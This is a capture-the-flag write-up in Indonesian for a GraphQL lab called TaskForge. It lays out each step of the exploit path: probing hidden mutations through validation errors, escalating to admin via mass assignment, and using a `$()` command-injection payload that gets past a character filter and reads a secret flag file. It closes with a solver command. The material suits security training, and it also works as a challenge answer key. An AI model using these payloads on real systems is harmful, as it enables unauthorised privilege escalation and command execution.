# Blueprint Writeup

## Ringkasan

TaskForge adalah API GraphQL dengan introspection dimatikan. Bug utamanya adalah kombinasi validasi GraphQL yang masih membocorkan field tersembunyi, mass assignment pada `updateProfile`, dan command injection pada fitur maintenance admin.

## Exploit Path

1. Login sebagai user seed biasa:

```graphql
mutation {
  login(username: "bob", password: "password123") {
    token
    user { id username role }
  }
}
```

2. Cek bahwa introspection gagal:

```graphql
{ __schema { types { name } } }
```

3. Probe field tersembunyi lewat error validasi. Introspection gagal, tapi GraphQL tetap memberi error untuk field atau argumen yang salah:

```graphql
mutation {
  runMaintenanceTask(scriptz: "status") { output }
}
```

Error tersebut mengonfirmasi mutation tersembunyi `runMaintenanceTask(script: String!)`.

4. Naikkan role lewat mass assignment:

```graphql
mutation {
  updateProfile(role: "admin", bio: "x") {
    id
    role
  }
}
```

5. Ambil flag lewat command substitution. Filter memblokir `;`, `|`, `&`, backtick, newline, dan redirection, tapi masih membolehkan `$()`:

```graphql
mutation {
  runMaintenanceTask(script: "backup $(cat /opt/app/secret/flag.txt)") {
    output
  }
}
```

Output maintenance akan berisi flag.

## Solver

Solver otomatis tersedia di:

```bash
python3 solver/solve.py http://127.0.0.1:8011
```

Solver melakukan validasi end-to-end: introspection harus gagal, hidden mutation bisa diprobe, member belum bisa menjalankan maintenance task, privilege escalation berhasil, filter `&&` ditolak, lalu payload `$()` membaca flag.
